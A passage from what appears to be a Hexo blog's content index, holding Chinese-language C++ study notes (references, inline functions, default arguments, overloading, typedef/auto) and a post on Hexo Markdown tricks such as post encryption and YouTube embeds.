class="type">void</span> <span class="title">g</span><span class="params">(A a)</span></span>;      <span class="comment">//以A类对象a为形参的成员函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Functions</title>
      <link href="/zh/2022/07/20/CPP/C++%20Functions/"/>
      <url>/zh/2022/07/20/CPP/C++%20Functions/</url>
      
        <content type="html"><![CDATA[<h2 id="函数">函数</h2><h3 id="rand-函数">rand 函数</h3><p>函数原型: <code>int rand(void);</code> 所需头文件:<code>&lt;cstdlib&gt;</code> 函数及返回值: 生成并返回一个伪随机数</p><hr /><h3 id="srand-函数">srand 函数</h3><p>函数原型: <code>void srand(unsigned int seed);</code> 参数:生成随机数的种子 所需头文件: <code>&lt;cstdlib&gt;</code> 函数: 设置rand() 生成一系列伪随机整数的起始点。使用 1 作为种子参数可以重新初始化rand()。</p><hr /><h2id="需要注意的是如果不使用种子每次程序运行生成的随机数将是-固定且不变-的因此rand-函数返回的是-伪随机数">需要注意的是，如果不使用种子，每次程序运行生成的随机数将是<strong>固定且不变</strong> 的。因此，rand 函数返回的是<strong>伪随机数</strong>。</h2><h3 id="引用的概念">引用的概念</h3><ul><li>引用 (&amp;) 是标识符的别名；</li><li>定义引用时，必须同时初始化以指向现有对象。 例如：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">int</span> &amp;ri = i; <span class="comment">// 定义 int 引用 ri，并将其初始化为变量 i 的引用</span></span><br><span class="line">j = <span class="number">10</span>;</span><br><span class="line">ri = j;  <span class="comment">// 等价于 i = j;</span></span><br></pre></td></tr></table></figure><ul><li>一旦引用被初始化，就不能更改为指向其他对象。引用可以作为形式参数使用。</li></ul><div class="note info flat"><p>引用可以实现函数形式参数与实际参数之间的双向传递</p></div><p>例如，以下程序：</p><h2 id="section"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span> <span class="comment">// 定义引用类型的形式参数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">5</span>, y = <span class="number">10</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x = &quot;</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;  y = &quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">swap</span>(x, y);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x = &quot;</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;  y = &quot;</span>&lt;&lt;y&lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="可变参数的函数">可变参数的函数</h3><p>C++ 标准主要提供两种方法</p><ul><li>如果所有实际参数类型相同，可以传递一个称为 initializer_list的标准库类型；</li><li><h2id="如果实际参数类型不同我们可以编写可变参数模板第-9-章">如果实际参数类型不同，我们可以编写可变参数模板（第9 章）。</h2><h4 id="initializer_list">initializer_list</h4></li></ul><p><code>initializer_list</code>是一个标准库类型，用于表示特定类型的值数组，在同名的头文件中定义。</p><hr /><h4 id="initializer_list-的使用">initializer_list 的使用</h4><ul><li>initializer_list 是一个类模板（模板在第 9 章中详细介绍）</li><li>使用模板时，需要在模板名称后跟一对尖括号，尖括号内为类型参数。例如：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">initializer_list&lt;string&gt;  ls;  <span class="comment">// initializer_list 的元素类型为 string</span></span><br><span class="line">initializer_list&lt;<span class="type">int</span>&gt; li;      <span class="comment">// initializer_list 的元素类型为 int</span></span><br></pre></td></tr></table></figure><ul><li>关于 initializer_list的一个特殊点是，其对象中的元素始终是常量值，我们不能更改initializer_list 对象中元素的值。</li><li><h2id="带有-initializer_list-形式参数的函数也可以同时具有其他形式参数">带有initializer_list 形式参数的函数也可以同时具有其他形式参数。</h2><h4 id="使用-initializer_list-的示例">使用 initializer_list的示例</h4></li><li>在编写代码以输出程序生成的错误消息时，最好使用统一的函数来实现此功能，以便对所有错误的处理可以保持一致。然而，错误消息的类型是不同的，调用错误消息输出函数时传递的参数也会有所不同。</li><li><h2id="使用-initializer_list-编写一个可以处理可变数量形式参数的错误消息输出函数">使用initializer_list编写一个可以处理可变数量形式参数的错误消息输出函数。</h2><h3 id="内联函数">内联函数</h3></li><li>声明时使用关键字 inline。</li><li>在编译时，将调用位置替换为函数体，从而节省参数传递、控制转移等的开销。</li><li>注意：<ul><li>内联函数体不能有循环语句和 switch 语句；</li><li>内联函数的定义必须出现在第一次调用内联函数之前；</li><li><h2 id="内联函数不能声明异常接口">内联函数不能声明异常接口。</h2><h4 id="应用示例">应用示例</h4></li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">double</span> PI = <span class="number">3.14159265358979</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">double</span> <span class="title">calArea</span><span class="params">(<span class="type">double</span> radius)</span> <span class="comment">// inline 关键字</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> PI * radius * radius;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> r = <span class="number">3.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> area = <span class="built_in">calArea</span>(r);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; area &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本质上，它省略了函数调用和返回，类似于将函数体直接粘贴到调用位置。</p><table style="width:6%;"><colgroup><col style="width: 5%" /></colgroup><thead><tr class="header"><th>### constexpr 函数（用法不太清楚）</th></tr></thead><tbody><tr class="odd"><td>#### constexpr 函数示例</td></tr><tr class="even"><td>- constexpr int get_size() { return 20; } - constexpr int foo =get_size(); // 正确：foo 是一个常量表达式</td></tr></tbody></table><h3 id="带默认参数值的函数">带默认参数值的函数</h3><h4 id="默认参数值声明的顺序">默认参数值声明的顺序</h4><ul><li>带默认值的形式参数必须列在参数列表的最右侧，即不能有没有默认值的参数在默认参数值的右侧；</li><li>调用时实际参数与形式参数的绑定顺序是从左到右。</li><li>示例：</li></ul><h2 id="section-1"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y = <span class="number">5</span>, <span class="type">int</span> z = <span class="number">6</span>)</span></span>;<span class="comment">// 正确</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">1</span>, <span class="type">int</span> y = <span class="number">5</span>, <span class="type">int</span> z)</span></span>;<span class="comment">// 错误</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">1</span>, <span class="type">int</span> y, <span class="type">int</span> z = <span class="number">6</span>)</span></span>;<span class="comment">// 错误</span></span><br></pre></td></tr></table></figure></h2><h4 id="默认参数值与函数调用位置">默认参数值与函数调用位置</h4><p>如果一个函数有原型声明，并且原型声明在定义之前，则默认参数值应在函数原型声明中给出；如果只有函数定义，或者函数定义在前，则默认参数值可以在函数定义中给出。例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">5</span> ,<span class="type">int</span> y = <span class="number">6</span>)</span>；<span class="comment">// 原型声明在前</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">add</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;<span class="comment">// 这里不能再次指定默认值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="section-2"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">5</span> ,<span class="type">int</span> y = <span class="number">6</span>)</span><span class="comment">// 只有定义，没有原型声明</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">add</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="函数重载">函数重载</h3><p>C++允许在同一作用域内使用相同的函数名声明具有相似功能的函数，从而形成重载。这方便使用且易于记忆。</p><p>注意事项：</p><ul><li>重载函数必须具有不同的形式参数：不同的数量或不同的类型。</li><li>编译器将根据实际参数和形式参数的类型和数量的最佳匹配来选择调用哪个函数。（编译器不区分形式参数名称和函数返回值）</li><li>不要将功能不同的函数声明为重载函数，以避免在调用结果中产生误解和混淆。</li></ul><p>函数重载应用示例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sumOfSquare</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * a + b * b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">sumOfSquare</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * a + b * b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;输入两个整数: &quot;</span>;</span><br><span class="line">    cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;它们的平方和: &quot;</span>&lt;&lt;<span class="built_in">sumOfSquare</span>(m, n)&lt;&lt;endl;</span><br><span class="line">    <span class="type">double</span> x, y;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;输入两个实数: &quot;</span>;</span><br><span class="line">    cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;它们的平方和: &quot;</span>&lt;&lt;<span class="built_in">sumOfSquare</span>(x, y)&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果： 输入两个整数: 3 5 它们的平方和: 34 输入两个实数: 2.3 5.8它们的平方和: 38.93</p>]]></content>
      
      
      <categories>
          
          <category> C/C++ 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Important Points to Note in C++ Basics</title>
      <link href="/zh/2022/07/20/CPP/Important%20Points%20to%20Note%20in%20C++%20Basics/"/>
      <url>/zh/2022/07/20/CPP/Important%20Points%20to%20Note%20in%20C++%20Basics/</url>
      
        <content type="html"><![CDATA[<h2 id="数据输入与输出">数据输入与输出</h2><h3 id="io-流">I/O 流</h3><p>在 C++ 中，数据从一个对象流向另一个对象被抽象为“流”。cin 和 cout是预定义的流类对象，其中 cin 用于处理标准输入（键盘输入），而 cout用于处理标准输出（屏幕输出）。</p><hr /><h3 id="预定义的插入和提取运算符">预定义的插入和提取运算符</h3><p>“&lt;&lt;” 是预定义的插入运算符，当应用于流类对象 cout时，可以实现最一般的屏幕输出。</p><p>“&gt;&gt;” 是提取运算符，当应用于流类对象 cin时，可以实现最一般的键盘输入。</p><hr /><h3 id="常见的-io-流库操控符">常见的 I/O 流库操控符</h3><table><thead><tr class="header"><th>操控符名称</th><th>意义</th></tr></thead><tbody><tr class="odd"><td>dec</td><td>十进制表示的数字数据</td></tr><tr class="even"><td>hex</td><td>十六进制表示的数字数据</td></tr><tr class="odd"><td>oct</td><td>八进制表示的数字数据</td></tr><tr class="even"><td>ws</td><td>提取空白字符</td></tr><tr class="odd"><td>endl</td><td>插入换行并刷新流</td></tr><tr class="even"><td>setsprecision(int)</td><td>设置浮点数的小数位数（包括小数点）</td></tr><tr class="odd"><td>setw(int)</td><td>设置字段宽度</td></tr></tbody></table><hr /><h2 id="if-else-语句">if-else 语句</h2><p>首先，<code>else</code> 的配对方法是通过向上查找与同一层级的<code>if</code> 配对。 例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>()</span><br><span class="line">    <span class="keyword">if</span>()</span><br><span class="line">    <span class="keyword">else</span>()</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span>()</span><br><span class="line">    <span class="built_in">else</span>()</span><br></pre></td></tr></table></figure><p>这是可行的，因为所有 <code>else</code>语句都有配对，但缩进并不代表结构。严格来说，应该使用 <code>&#123;&#125;</code>来区分不同的嵌套层级。<strong>仅用于区分不同的结构</strong>。</p><hr /><p><strong>反例</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>()</span><br><span class="line">    <span class="keyword">if</span>()</span><br><span class="line"><span class="keyword">else</span></span><br></pre></td></tr></table></figure><p>在这种情况下，<code>else</code> 与缩进的 <code>if</code> 配对。</p><hr /><h2 id="typedef-声明">typedef 声明</h2><p>typedef existing_type_name new_type_name_list</p><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">double</span> Area,Volume;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Natural;</span><br><span class="line">Natural i1,i2;</span><br><span class="line">Area a;</span><br><span class="line">Volume v;</span><br></pre></td></tr></table></figure><hr /><h2 id="除了-typedef-之外定义自定义类型的另一种方法using">除了 typedef之外定义自定义类型的另一种方法：using</h2><p><code>using new_type_name = existing_type_name</code></p><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Area = <span class="type">double</span>;</span><br><span class="line"><span class="keyword">using</span> Volume = <span class="type">double</span>;</span><br></pre></td></tr></table></figure><h2 id="auto-类型和-decltype-类型">auto 类型和 decltype 类型</h2><p><code>auto</code>：编译器通过初始值自动确定变量类型<br /><code>decltype</code>：定义一个与某个表达式具有相同类型的变量，但不使用该表达式初始化变量<br />例如：<code>decltype(i) j = 2;</code> 使 j 具有与 i 相同的类型，但不使用2 初始化 j。</p>]]></content>
      
      
      <categories>
          
          <category> C/C++ 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog Writing Tricks</title>
      <link href="/zh/2022/07/20/Blog/Blog%20Writing%20Tricks/"/>
      <url>/zh/2022/07/20/Blog/Blog%20Writing%20Tricks/</url>
      
        <content type="html"><![CDATA[<h2 id="粗体和斜体">粗体和斜体</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**你好，世界！**</span></span><br><span class="line"><span class="emphasis">*你好，世界！*</span></span><br></pre></td></tr></table></figure><p><strong>你好，世界！</strong> <em>你好，世界！</em></p><hr /><h2 id="行内-html">行内 HTML</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span>要重启计算机，请按 <span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>ctrl<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>+<span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>alt<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>+<span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>del<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>。<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>要重启计算机，请按 <kbd>ctrl</kbd>+<kbd>alt</kbd>+<kbd>del</kbd>。</p><hr /><h2 id="博客加密">博客加密</h2><h3 id="安装-hexo-blog-encrypt-插件">安装 hexo-blog-encrypt 插件</h3><ul><li>在 hexo 目录下运行 <code>npm install hexo-blog-encrypt</code></li><li>将以下内容添加到 <code>/Hexo/_config.yml</code> 文件中：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">encrypt</span>:</span><br><span class="line">  <span class="attr">enable</span>:<span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="使用插件">使用插件</h3><ul><li>在需要使用加密的博客文章头部添加相应文本：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="attr">title</span>: <span class="title class_">Hexo</span>加密功能</span><br><span class="line"><span class="attr">date</span>: <span class="number">2019</span>-<span class="number">09</span>-<span class="number">04</span> <span class="number">23</span>:<span class="number">20</span>:<span class="number">00</span>   </span><br><span class="line"><span class="attr">tags</span>: [学习笔记,<span class="title class_">Hexo</span>]</span><br><span class="line"><span class="attr">categories</span>: 博客搭建</span><br><span class="line"><span class="attr">password</span>: smile   </span><br><span class="line"><span class="attr">abstract</span>: 欢迎来到我的博客，请输入密码阅读。 </span><br><span class="line"><span class="attr">message</span>: 密码输入框上描述性内容</span><br><span class="line">---</span><br></pre></td></tr></table></figure><ul><li>其中：<ul><li>password: 此博客文章使用的密码</li><li>abstract: 博客摘要文本（简短）</li><li>message: 密码输入框上方的描述性文本</li></ul></li></ul><p><ahref="https://cloud.tencent.com/developer/article/1917942">原始链接</a></p><hr /><h2 id="插入-youtube-视频">插入 YouTube 视频</h2><h3 id="静态图片链接">静态图片链接</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Html 版本：</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youtu.be/BSlMAJ7SkMA&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;图片替代文本&quot;</span> <span class="attr">width</span>=<span class="string">&quot;240&quot;</span> <span class="attr">height</span>=<span class="string">&quot;180&quot;</span> <span class="attr">border</span>=<span class="string">&quot;10&quot;</span> /&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">纯 Markdown 版本：</span><br><span class="line"></span><br><span class="line">[<span class="string">![图片替代文本</span>](<span class="link">https://img.youtube.com/vi/ARted4RniaU/0.jpg</span>)](<span class="link">https://www.youtube.com/watch?v=ARted4RniaU</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://youtu.be/BSlMAJ7SkMA" target="_blank"><img src="https://img.youtube.com/vi/ARted4RniaU/0.jpg" alt="图片替代文本" width="700" height="500" border="20" /></a></p><p>纯 Markdown 版本：</p><p><a href="https://www.youtube.com/watch?v=ARted4RniaU"><imgsrc="https://img.youtube.com/vi/ARted4RniaU/0.jpg"alt="图片替代文本" /></a></p><hr /><h3 id="嵌入视频">嵌入视频</h3><h4 id="方法-1">方法 1：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% youtube video_id %&#125;</span><br></pre></td></tr></table></figure><div class="video-container"><iframe src="https://www.youtube.com/embed/BSlMAJ7SkMA" frameborder="0" loading="lazy" allowfullscreen></iframe></div><p>如何找到视频 ID：</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-20%2015.05.24.png" /></p><p>地址后面的 <strong>字母数字字符串</strong>，例如：BSlMAJ7SkMA</p><hr /><h4 id="方法-2">方法 2：</h4><p>点击上面图片中的嵌入选项，提供 HTML 代码（HTML 和 Markdown有一定兼容性），直接复制到 md 文件中。</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-20%2015.05.39.png" /></p><div class="note info flat"><p>您可以修改一些 HTML 属性，如宽度和高度。特别是 width=100%会使其拉伸到全宽。</p></div><iframe width="100%" height="400" src="https://www.youtube.com/embed/BSlMAJ7SkMA" title="YouTube 视频播放器" frameborder="10" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><hr /><h2 id="块引用">块引用</h2><p>在您的博客中添加引用…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote [作者,来源] [链接] [来源链接标题] %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><blockquote><p>感谢观看！</p><footer><strong>lixiang, daily</strong><cite><a href="https://hustlixiang21.github.io">李翔的博客</a></cite></footer></blockquote><hr /><p>可以嵌套！</p><blockquote><p>感谢观看！</p><blockquote><p>感谢观看！</p><footer><strong>lixiang,daily</strong><cite><a href="https://hustlixiang21.github.io">李翔的博客</a></cite></footer></blockquote><footer><strong>lixiang, daily</strong><cite><a href="https://hustlixiang21.github.io">李翔的博客</a></cite></footer></blockquote><hr /><h2 id="注意bootstrap-提示">注意（Bootstrap 提示）</h2><p>每种方法分为简单、现代和平面主题，这就是所谓的样式。</p><p>这里我只展示平面样式</p><h3 id="方法-1-1">方法 1：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note flat %&#125;</span><br><span class="line">默认提示块标签</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;</span><br><span class="line">默认提示块标签</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;</span><br><span class="line">主要提示块标签</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;</span><br><span class="line">成功提示块标签</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;</span><br><span class="line">信息提示块标签</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;</span><br><span class="line">警告提示块标签</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;</span><br><span class="line">危险提示块标签</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><div class="note flat"><p>默认提示块标签</p></div><div class="note default flat"><p>默认提示块标签</p></div><div class="note primary flat"><p>主要提示块标签</p></div><div class="note success flat"><p>成功提示块标签</p></div><div class="note info flat"><p>信息提示块标签</p></div><div class="note warning flat"><p>警告提示块标签</p></div><div class="note danger flat"><p>危险提示块标签</p></div><hr /><h3 id="方法-2-1">方法 2：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;</span><br><span class="line">您在使用 Visa 还是银联</span><br><span 